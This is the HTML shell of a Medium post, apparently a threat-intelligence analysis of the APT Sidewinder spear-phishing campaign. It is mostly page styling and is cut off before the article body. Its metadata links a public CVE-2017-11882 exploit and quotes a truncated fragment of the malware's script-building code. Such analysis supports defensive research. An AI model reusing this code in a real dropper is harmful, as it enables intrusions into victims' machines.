<!doctype html><html lang="en"><head><title data-rh="true">APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading | by Sebdraven | Medium</title><meta data-rh="true" charset="utf-8"/><meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1"/><meta data-rh="true" name="theme-color" content="#000000"/><meta data-rh="true" name="twitter:app:name:iphone" content="Medium"/><meta data-rh="true" name="twitter:app:id:iphone" content="828256236"/><meta data-rh="true" property="al:ios:app_name" content="Medium"/><meta data-rh="true" property="al:ios:app_store_id" content="828256236"/><meta data-rh="true" property="al:android:package" content="com.medium.reader"/><meta data-rh="true" property="fb:app_id" content="542599432471018"/><meta data-rh="true" property="og:site_name" content="Medium"/><meta data-rh="true" property="og:type" content="article"/><meta data-rh="true" property="article:published_time" content="2018-07-17T14:57:10.410Z"/><meta data-rh="true" name="title" content="APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading | by Sebdraven | Medium"/><meta data-rh="true" property="og:title" content="APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading"/><meta data-rh="true" property="al:android:url" content="medium://p/5bc1a7e7c84c"/><meta data-rh="true" property="al:ios:url" content="medium://p/5bc1a7e7c84c"/><meta data-rh="true" property="al:android:app_name" content="Medium"/><meta data-rh="true" name="description" content="The implementation has many matching with the public exploit: https://github.com/0x09AL/CVE-2017-11882-metasploit tst = getProfile(“0”) &amp; “$c=”””&amp;c&amp;”””;$m=”””&amp;m&amp;”””;”&amp;…"/><meta data-rh="true" property="og:description" content="Spear phishing"/><meta data-rh="true" property="og:url" content="https://sebdraven.medium.com/apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c"/><meta data-rh="true" property="al:web:url" content="https://sebdraven.medium.com/apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c"/><meta data-rh="true" property="og:image" content="https://miro.medium.com/v2/resize:fit:1024/1*UNB3nsU-2fey_uCyR0BC4w.png"/><meta data-rh="true" property="article:author" content="https://sebdraven.medium.com"/><meta data-rh="true" name="author" content="Sebdraven"/><meta data-rh="true" name="robots" content="index,noarchive,follow,max-image-preview:large"/><meta data-rh="true" name="referrer" content="unsafe-url"/><meta data-rh="true" property="twitter:title" content="APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading"/><meta data-rh="true" name="twitter:site" content="@Medium"/><meta data-rh="true" name="twitter:app:url:iphone" content="medium://p/5bc1a7e7c84c"/><meta data-rh="true" property="twitter:description" content="Spear phishing"/><meta data-rh="true" name="twitter:image:src" content="https://miro.medium.com/v2/resize:fit:1024/1*UNB3nsU-2fey_uCyR0BC4w.png"/><meta data-rh="true" name="twitter:card" content="summary_large_image"/><meta data-rh="true" name="twitter:creator" content="@Sebdraven"/><meta data-rh="true" name="twitter:label1" content="Reading time"/><meta data-rh="true" name="twitter:data1" content="7 min read"/><link data-rh="true" rel="icon" href="https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19"/><link data-rh="true" rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml"/><link data-rh="true" rel="apple-touch-icon" sizes="152x152" href="https://miro.medium.com/v2/resize:fill:304:304/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="120x120" href="https://miro.medium.com/v2/resize:fill:240:240/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="76x76" href="https://miro.medium.com/v2/resize:fill:152:152/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="60x60" href="https://miro.medium.com/v2/resize:fill:120:120/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="mask-icon" href="https://miro.medium.com/v2/resize:fill:1000:1000/7*GAOKVe--MXbEJmV9230oOQ.png" color="#171717"/><link data-rh="true" rel="preconnect" href="https://glyph.medium.com" crossOrigin=""/><link data-rh="true" id="glyph_preload_link" rel="preload" as="style" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" id="glyph_link" rel="stylesheet" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" rel="author" href="https://sebdraven.medium.com"/><link data-rh="true" rel="canonical" href="https://sebdraven.medium.com/apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c"/><link data-rh="true" rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/5bc1a7e7c84c"/><script data-rh="true" type="application/ld+json">{"@context":"http:\u002F\u002Fschema.org","@type":"NewsArticle","image":["https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:1200\u002F1*UNB3nsU-2fey_uCyR0BC4w.png"],"url":"https:\u002F\u002Fsebdraven.medium.com\u002Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c","dateCreated":"2018-07-16T21:01:02.686Z","datePublished":"2018-07-16T21:01:02.686Z","dateModified":"2018-07-17T16:36:32.349Z","headline":"APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading","name":"APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading","description":"The implementation has many matching with the public exploit: https:\u002F\u002Fgithub.com\u002F0x09AL\u002FCVE-2017-11882-metasploit tst = getProfile(“0”) & “$c=”””&c&”””;$m=”””&m&”””;”&…","identifier":"5bc1a7e7c84c","author":{"@type":"Person","name":"Sebdraven","url":"https:\u002F\u002Fsebdraven.medium.com"},"creator":["Sebdraven"],"publisher":{"@type":"Organization","name":"Medium","url":"https:\u002F\u002Fsebdraven.medium.com\u002F","logo":{"@type":"ImageObject","width":272,"height":60,"url":"https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:544\u002F7*V1_7XP4snlmqrc_0Njontw.png"}},"mainEntityOfPage":"https:\u002F\u002Fsebdraven.medium.com\u002Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c"}</script><style type="text/css" data-fela-rehydration="591" data-fela-type="STATIC">html{box-sizing:border-box;-webkit-text-size-adjust:100%}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}#speechify-root{font-family:Sohne, sans-serif}div[data-popper-reference-hidden="true"]{visibility:hidden;pointer-events:none}.grecaptcha-badge{visibility:hidden}
/*XCode style (c) Angel Garcia <angelgarcia.mail@gmail.com>*/.hljs {background: #fff;color: black;
}/* Gray DOCTYPE selectors like WebKit */
.xml .hljs-meta {color: #c0c0c0;
}.hljs-comment,
.hljs-quote {color: #007400;
}.hljs-tag,
.hljs-attribute,
.hljs-keyword,
.hljs-selector-tag,
.hljs-literal,
.hljs-name {color: #aa0d91;
}.hljs-variable,
.hljs-template-variable {color: #3F6E74;
}.hljs-code,
.hljs-string,
.hljs-meta .hljs-string {color: #c41a16;
}.hljs-regexp,
.hljs-link {color: #0E0EFF;
}.hljs-title,
.hljs-symbol,
.hljs-bullet,
.hljs-number {color: #1c00cf;
}.hljs-section,
.hljs-meta {color: #643820;
}.hljs-title.class_,
.hljs-class .hljs-title,
.hljs-type,
.hljs-built_in,
.hljs-params {color: #5c2699;
}.hljs-attr {color: #836C28;
}.hljs-subst {color: #000;
}.hljs-formula {background-color: #eee;font-style: italic;
}.hljs-addition {background-color: #baeeba;
}.hljs-deletion {background-color: #ffc8bd;
}.hljs-selector-id,
.hljs-selector-class {color: #9b703f;
}.hljs-doctag,
.hljs-strong {font-weight: bold;
}.hljs-emphasis {font-style: italic;
}
</style><style type="text/css" data-fela-rehydration="591" data-fela-type="KEYFRAME">@-webkit-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-moz-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}</style><style type="text/css" data-fela-rehydration="591" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.l{display:block}.m{position:sticky}.n{top:0}.o{z-index:500}.p{padding:0 24px}.q{align-items:center}.r{border-bottom:solid 1px #F2F2F2}.y{height:41px}.z{line-height:20px}.ab{display:flex}.ac{height:57px}.ae{flex:1 0 auto}.af{gap:16px}.ag{color:inherit}.ah{fill:inherit}.ai{font-size:inherit}.aj{border:inherit}.ak{font-family:inherit}.al{letter-spacing:inherit}.am{font-weight:inherit}.an{padding:0}.ao{margin:0}.ap{cursor:pointer}.aq:disabled{cursor:not-allowed}.ar:disabled{color:#6B6B6B}.as:disabled{fill:#6B6B6B}.av{width:auto}.aw path{fill:#242424}.ax{height:25px}.ay{border:none}.az{border-radius:20px}.ba{width:240px}.bb{background:#F9F9F9}.bc path{fill:#6B6B6B}.be{outline:none}.bf{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.bg{font-size:14px}.bh{width:100%}.bi{padding:10px 20px 10px 0}.bj{background-color:transparent}.bk{color:#242424}.bl::placeholder{color:#6B6B6B}.bm{display:inline-block}.bn{margin-left:12px}.bo{margin-right:12px}.bp{border-radius:4px}.bq{margin-left:24px}.br{height:24px}.bx{background-color:#F9F9F9}.by{border-radius:50%}.bz{height:32px}.ca{width:32px}.cb{width:0}.cc{border-right:none}.cd{transition:width 300ms}.ce{flex:0 0 auto}.cf{padding:24px 0}.cg{flex-direction:column}.ch{gap:8px}.ci{transform:translateX(-240px)}.cj{transition:transform 300ms}.ck{position:fixed}.cl{text-align:left}.cm{color:#6B6B6B}.cp{padding:8px 24px}.cq{margin-left:16px}.cr{overflow:hidden}.cs{max-height:20px}.ct{text-overflow:ellipsis}.cu{display:-webkit-box}.cv{-webkit-line-clamp:1}.cw{-webkit-box-orient:vertical}.cx{word-break:break-all}.cz{list-style:none}.da{flex-shrink:0}.db{margin-left:8px}.dc{stroke:#242424}.dd{stroke-width:1.5}.de{stroke-linecap:round}.df{stroke-linejoin:round}.dg{height:20px}.dh{padding:12px 24px 12px 64px}.di{border-bottom:1px solid #E5E5E5}.dj{margin:8px 24px}.dk{width:24px}.dl{width:calc(100% - 240px)}.dm{flex:1 1 auto}.dn{justify-content:center}.dt{max-width:680px}.du{min-width:0}.dv{animation:k1 1.2s ease-in-out infinite}.dw{height:100vh}.dx{margin-bottom:16px}.dy{margin-top:48px}.dz{align-items:flex-start}.ea{justify-content:space-between}.eb{margin-bottom:24px}.eh{width:80%}.ei{background-color:#F2F2F2}.ep{height:44px}.eq{width:44px}.er{margin:auto 0}.es{margin-bottom:4px}.et{height:16px}.eu{width:120px}.ev{width:80px}.fb{margin-bottom:8px}.fc{width:96%}.fd{width:98%}.fe{width:81%}.ff{font-size:13px}.fg{height:100%}.fy{color:#FFFFFF}.fz{fill:#FFFFFF}.ga{background:#1A8917}.gb{border-color:#1A8917}.gf:disabled{cursor:inherit !important}.gg:disabled{opacity:0.3}.gh:disabled:hover{background:#1A8917}.gi:disabled:hover{border-color:#1A8917}.gj{border-radius:99em}.gk{border-width:1px}.gl{border-style:solid}.gm{box-sizing:border-box}.gn{text-decoration:none}.go{text-align:center}.gr{margin-right:32px}.gs{position:relative}.gt{fill:#6B6B6B}.gv{background:transparent}.gw svg{margin-left:4px}.gx svg{fill:#6B6B6B}.gz{box-shadow:inset 0 0 0 1px rgba(0, 0, 0, 0.05)}.ha{position:absolute}.hh{margin:0 24px}.hl{background:rgba(255, 255, 255, 1)}.hm{border:1px solid #F2F2F2}.hn{box-shadow:0 1px 4px #F2F2F2}.ho{max-height:100vh}.hp{overflow-y:auto}.hq{left:0}.hr{top:calc(100vh + 100px)}.hs{bottom:calc(100vh + 100px)}.ht{width:10px}.hu{pointer-events:none}.hv{word-break:break-word}.hw{word-wrap:break-word}.hx:after{display:block}.hy:after{content:""}.hz:after{clear:both}.ia{line-height:1.23}.ib{letter-spacing:0}.ic{font-style:normal}.id{font-weight:700}.ji{align-items:baseline}.jj{width:48px}.jk{height:48px}.jl{border:2px solid rgba(255, 255, 255, 1)}.jm{z-index:0}.jn{box-shadow:none}.jo{border:1px solid rgba(0, 0, 0, 0.05)}.jp{margin-bottom:2px}.jq{flex-wrap:nowrap}.jr{font-size:16px}.js{line-height:24px}.ju{margin:0 8px}.jv{display:inline}.jw{text-decoration:underline}.jz{flex-wrap:wrap}.ka{padding-left:8px}.kb{padding-right:8px}.lc> *{flex-shrink:0}.ld{overflow-x:scroll}.le::-webkit-scrollbar{display:none}.lf{scrollbar-width:none}.lg{-ms-overflow-style:none}.lh{width:74px}.li{flex-direction:row}.lj{z-index:2}.lk{margin-right:4px}.ln{-webkit-user-select:none}.lo{border:0}.lp{fill:rgba(117, 117, 117, 1)}.ls{outline:0}.lt{user-select:none}.lu> svg{pointer-events:none}.md{cursor:progress}.me{opacity:1}.mf{padding:4px 0}.mi{margin-top:0px}.mj{width:16px}.ml{display:inline-flex}.mr{max-width:100%}.ms{padding:8px 2px}.mt svg{color:#6B6B6B}.nk{line-height:1.12}.nl{letter-spacing:-0.022em}.nm{font-weight:600}.oh{margin-bottom:-0.28em}.oi{float:left}.oj{font-size:66px}.ok{line-height:.83}.oq{line-height:1.58}.or{letter-spacing:-0.004em}.os{font-family:source-serif-pro, Georgia, Cambria, "Times New Roman", Times, serif}.pn{margin-bottom:-0.46em}.pt{margin-left:auto}.pu{margin-right:auto}.pv{max-width:1322px}.qb{clear:both}.qd{cursor:zoom-in}.qe{z-index:auto}.qg{height:auto}.qh{max-width:766px}.qi{max-width:733px}.qj{max-width:826px}.qk{box-shadow:inset 3px 0 0 0 #242424}.ql{padding-left:23px}.qm{margin-left:-20px}.qn{font-style:italic}.qo{max-width:989px}.qp{max-width:969px}.qq{list-style-type:disc}.qr{margin-left:30px}.qs{padding-left:0px}.qy{max-width:634px}.re{max-width:1192px}.rf{padding-top:5px}.rg{padding-bottom:5px}.rh{max-width:850px}.ri{margin-top:32px}.rj{margin-bottom:14px}.rk{padding-top:24px}.rl{padding-bottom:10px}.rm{background-color:#000000}.rn{height:3px}.ro{width:3px}.rp{margin-right:20px}.rq{max-width:1028px}.rr{max-width:1024px}.rx{box-shadow:inset 0 0 0 1px #F2F2F2}.ry{padding:0px}.rz{padding:16px 20px}.sb{max-height:40px}.sc{-webkit-line-clamp:2}.sd{margin-top:8px}.se{margin-top:12px}.sf{width:160px}.sg{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*BQtQCP2DxBVQoBT6)}.sh{background-origin:border-box}.si{background-size:cover}.sj{height:167px}.sk{background-position:50% 50%}.sl{margin-bottom:26px}.sm{margin-top:6px}.sn{margin-right:8px}.so{padding:8px 16px}.sp{border-radius:100px}.sq{transition:background 300ms ease}.ss{white-space:nowrap}.st{border-top:none}.su{margin-bottom:50px}.sv{height:52px}.sw{max-height:52px}.sx{box-sizing:content-box}.sy{position:static}.sz{z-index:1}.tb{max-width:155px}.th{margin-bottom:64px}.tw{height:64px}.tx{width:64px}.ty{align-self:flex-end}.tz{color:rgba(255, 255, 255, 1)}.ua{fill:rgba(255, 255, 255, 1)}.ub{background:rgba(25, 25, 25, 1)}.uc{border-color:rgba(25, 25, 25, 1)}.uf:disabled{opacity:0.1}.ug:disabled:hover{background:rgba(25, 25, 25, 1)}.uh:disabled:hover{border-color:rgba(25, 25, 25, 1)}.ul{padding-right:4px}.um{font-weight:500}.uz{white-space:pre-wrap}.va{margin-top:16px}.vb{margin-bottom:54px}.vc{height:0px}.vd{gap:18px}.ve{fill:rgba(61, 61, 61, 1)}.vq{border-bottom:solid 1px #E5E5E5}.vr{margin-top:72px}.vs{margin-bottom:0px}.vt{margin-right:16px}.at:hover:not(:disabled){color:rgba(25, 25, 25, 1)}.au:hover:not(:disabled){fill:rgba(25, 25, 25, 1)}.cn:hover{color:#242424}.co:hover p{color:#242424}.gc:hover{background:#156D12}.gd:hover{border-color:#156D12}.ge:hover{cursor:pointer}.gu:hover{fill:#242424}.gy:hover svg{fill:#242424}.hb:hover{background-color:rgba(0, 0, 0, 0.1)}.jt:hover{text-decoration:underline}.lr:hover{fill:rgba(8, 8, 8, 1)}.mg:hover{fill:#000000}.mh:hover p{color:#000000}.mk:hover{color:#000000}.mu:hover svg{color:#000000}.sr:hover{background-color:#F2F2F2}.tv:hover{background-color:none}.ud:hover{background:#000000}.ue:hover{border-color:#242424}.vf:hover{fill:rgba(25, 25, 25, 1)}.bd:focus-within path{fill:#242424}.lq:focus{fill:rgba(8, 8, 8, 1)}.mv:focus svg{color:#000000}.qf:focus{transform:scale(1.01)}.lv:active{border-style:none}</style><style type="text/css" data-fela-rehydration="591" data-fela-type="RULE" media="all and (min-width: 1080px)">.d{display:none}.bw{width:64px}.ds{margin:0 64px}.eg{height:48px}.eo{margin-bottom:52px}.fa{margin-bottom:48px}.fp{font-size:14px}.fq{line-height:20px}.fw{font-size:13px}.fx{padding:5px 12px}.gq{display:flex}.hg{margin-bottom:50px}.hk{max-width:680px}.iy{font-size:42px}.iz{margin-top:1.19em}.ja{margin-bottom:32px}.jb{line-height:52px}.jc{letter-spacing:-0.011em}.jh{align-items:center}.ko{border-top:solid 1px #F2F2F2}.kp{border-bottom:solid 1px #F2F2F2}.kq{margin:32px 0 0}.kr{padding:3px 8px}.la> *{margin-right:24px}.lb> :last-child{margin-right:0}.mc{margin-top:0px}.mq{margin:0}.od{font-size:24px}.oe{margin-top:1.95em}.of{line-height:30px}.og{letter-spacing:-0.016em}.op{padding-top:7px}.pj{font-size:20px}.pk{margin-top:0.94em}.pl{line-height:32px}.pm{letter-spacing:-0.003em}.ps{margin-top:2.14em}.qa{margin-top:56px}.qx{margin-top:1.14em}.rd{max-width:1192px}.rw{margin-top:32px}.tg{display:inline-block}.ti{flex-direction:row}.tl{margin-bottom:0}.tm{margin-right:20px}.ui{max-width:500px}.ux{line-height:24px}.uy{letter-spacing:0}.vk{margin:40px 0 0}.vp{padding-top:72px}</style><style type="text/css" data-fela-rehydration="591" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e{display:none}.mb{margin-top:0px}.tf{display:inline-block}</style><style type="text/css" data-fela-rehydration="591" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f{display:none}.ma{margin-top:0px}.te{display:inline-block}</style><style type="text/css" data-fela-rehydration="591" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g{display:none}.ly{margin-top:0px}.lz{margin-right:0px}.sa{padding:10px 12px 10px}.td{display:inline-block}</style><style type="text/css" data-fela-rehydration="591" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h{display:none}.s{display:flex}.t{justify-content:space-between}.bs{width:24px}.do{margin:0 24px}.ec{height:40px}.ej{margin-bottom:44px}.ew{margin-bottom:32px}.fh{font-size:13px}.fi{line-height:20px}.fr{padding:0px 8px 1px}.hc{margin-bottom:2px}.ie{font-size:32px}.if{margin-top:1.01em}.ig{margin-bottom:24px}.ih{line-height:38px}.ii{letter-spacing:-0.014em}.jd{align-items:flex-start}.jx{flex-direction:column}.kc{margin:24px -24px 0}.kd{padding:0}.ks> *{margin-right:8px}.kt> :last-child{margin-right:24px}.ll{margin-left:0px}.lw{margin-top:0px}.lx{margin-right:0px}.mm{margin:0}.mw{border:1px solid #F2F2F2}.mx{border-radius:99em}.my{padding:0px 16px 0px 12px}.mz{height:38px}.na{align-items:center}.nc svg{margin-right:8px}.nn{font-size:20px}.no{margin-top:1.2em}.np{line-height:24px}.nq{letter-spacing:0}.ol{padding-top:0}.ot{font-size:18px}.ou{margin-top:0.67em}.ov{line-height:28px}.ow{letter-spacing:-0.003em}.po{margin-top:1.56em}.pw{margin-top:40px}.qt{margin-top:1.34em}.qz{max-width:100%}.rs{margin-top:24px}.tc{display:inline-block}.tt{margin-bottom:20px}.tu{margin-right:0}.un{font-size:24px}.uo{line-height:30px}.up{letter-spacing:-0.016em}.vg{margin:32px 0 0}.vl{padding-top:48px}.nb:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="591" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.i{display:none}.bv{width:64px}.dr{margin:0 64px}.ef{height:48px}.em{margin-bottom:52px}.ez{margin-bottom:48px}.fn{font-size:14px}.fo{line-height:20px}.fu{font-size:13px}.fv{padding:5px 12px}.gp{display:flex}.hf{margin-bottom:50px}.hj{max-width:680px}.it{font-size:42px}.iu{margin-top:1.19em}.iv{margin-bottom:32px}.iw{line-height:52px}.ix{letter-spacing:-0.011em}.jg{align-items:center}.kk{border-top:solid 1px #F2F2F2}.kl{border-bottom:solid 1px #F2F2F2}.km{margin:32px 0 0}.kn{padding:3px 8px}.ky> *{margin-right:24px}.kz> :last-child{margin-right:0}.mp{margin:0}.nz{font-size:24px}.oa{margin-top:1.95em}.ob{line-height:30px}.oc{letter-spacing:-0.016em}.oo{padding-top:7px}.pf{font-size:20px}.pg{margin-top:0.94em}.ph{line-height:32px}.pi{letter-spacing:-0.003em}.pr{margin-top:2.14em}.pz{margin-top:56px}.qw{margin-top:1.14em}.rc{max-width:1192px}.rv{margin-top:32px}.tj{flex-direction:row}.tn{margin-bottom:0}.to{margin-right:20px}.uj{max-width:500px}.uv{line-height:24px}.uw{letter-spacing:0}.vj{margin:40px 0 0}.vo{padding-top:72px}</style><style type="text/css" data-fela-rehydration="591" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.j{display:none}.w{display:flex}.x{justify-content:space-between}.bu{width:64px}.dq{margin:0 48px}.ee{height:48px}.el{margin-bottom:52px}.ey{margin-bottom:48px}.fl{font-size:13px}.fm{line-height:20px}.ft{padding:0px 8px 1px}.he{margin-bottom:50px}.hi{max-width:680px}.io{font-size:42px}.ip{margin-top:1.19em}.iq{margin-bottom:32px}.ir{line-height:52px}.is{letter-spacing:-0.011em}.jf{align-items:center}.kg{border-top:solid 1px #F2F2F2}.kh{border-bottom:solid 1px #F2F2F2}.ki{margin:32px 0 0}.kj{padding:3px 8px}.kw> *{margin-right:24px}.kx> :last-child{margin-right:0}.mo{margin:0}.nv{font-size:24px}.nw{margin-top:1.95em}.nx{line-height:30px}.ny{letter-spacing:-0.016em}.on{padding-top:7px}.pb{font-size:20px}.pc{margin-top:0.94em}.pd{line-height:32px}.pe{letter-spacing:-0.003em}.pq{margin-top:2.14em}.py{margin-top:56px}.qv{margin-top:1.14em}.rb{max-width:100%}.ru{margin-top:32px}.tk{flex-direction:row}.tp{margin-bottom:0}.tq{margin-right:20px}.uk{max-width:500px}.ut{line-height:24px}.uu{letter-spacing:0}.vi{margin:40px 0 0}.vn{padding-top:72px}</style><style type="text/css" data-fela-rehydration="591" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.k{display:none}.u{display:flex}.v{justify-content:space-between}.bt{width:24px}.dp{margin:0 24px}.ed{height:40px}.ek{margin-bottom:44px}.ex{margin-bottom:32px}.fj{font-size:13px}.fk{line-height:20px}.fs{padding:0px 8px 1px}.hd{margin-bottom:2px}.ij{font-size:32px}.ik{margin-top:1.01em}.il{margin-bottom:24px}.im{line-height:38px}.in{letter-spacing:-0.014em}.je{align-items:flex-start}.jy{flex-direction:column}.ke{margin:24px 0 0}.kf{padding:0}.ku> *{margin-right:8px}.kv> :last-child{margin-right:8px}.lm{margin-left:0px}.mn{margin:0}.nd{border:1px solid #F2F2F2}.ne{border-radius:99em}.nf{padding:0px 16px 0px 12px}.ng{height:38px}.nh{align-items:center}.nj svg{margin-right:8px}.nr{font-size:20px}.ns{margin-top:1.2em}.nt{line-height:24px}.nu{letter-spacing:0}.om{padding-top:0}.ox{font-size:18px}.oy{margin-top:0.67em}.oz{line-height:28px}.pa{letter-spacing:-0.003em}.pp{margin-top:1.56em}.px{margin-top:40px}.qu{margin-top:1.34em}.ra{max-width:100%}.rt{margin-top:24px}.tr{margin-bottom:20px}.ts{margin-right:0}.uq{font-size:24px}.ur{line-height:30px}.us{letter-spacing:-0.016em}.vh{margin:32px 0 0}.vm{padding-top:48px}.ni:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="591" data-fela-type="RULE" media="print">.ta{display:none}</style><style type="text/css" data-fela-rehydration="591" data-fela-type="RULE" media="(orientation: landscape) and (max-width: 903.98px)">.cy{max-height:none}</style><style type="text/css" data-fela-rehydration="591" data-fela-type="RULE" media="(prefers-reduced-motion: no-preference)">.qc{transition:transform 300ms cubic-bezier(0.2, 0, 0.2, 1)}</style></head><body><div id="root"><div class="a b c"><div class="d e f g h i j k"></div><script>document.domain = document.domain;</script><div class="l c"><div class="l m n o c"><div class="p q r s t u v w x i d y z"><a class="cm ah ff bf al b an ao ap aq ar as at au s u w i d q fg z" href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F5bc1a7e7c84c&amp;%7Efeature=LoOpenInAppButton&amp;%7Echannel=ShowPostUnderUser&amp;source=post_page---top_nav_layout_nav-----------------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="db"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ab q"><p class="bf b fh fi fj fk fl fm fn fo fp fq cm"><span><button class="bf b fh fi fr fj fk fs fl fm ft fu fo fv fw fq fx fy fz ga gb gc gd ge gf gg gh gi gj gk gl gm bm gn go" data-testid="headerSignUpButton">Sign up</button></span></p><div class="cq l"><p class="bf b fh fi fj fk fl fm fn fo fp fq cm"><span><a class="ag ah ai aj ak al am an ao ap aq ar as at au" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="p q r ab ac"><div class="ab q ae af"><a class="ag ah ai aj ak al am an ao ap aq ar as at au ab" aria-label="Homepage" data-testid="headerMediumLogo" href="https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" viewBox="0 0 719 160" class="av aw ax"><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 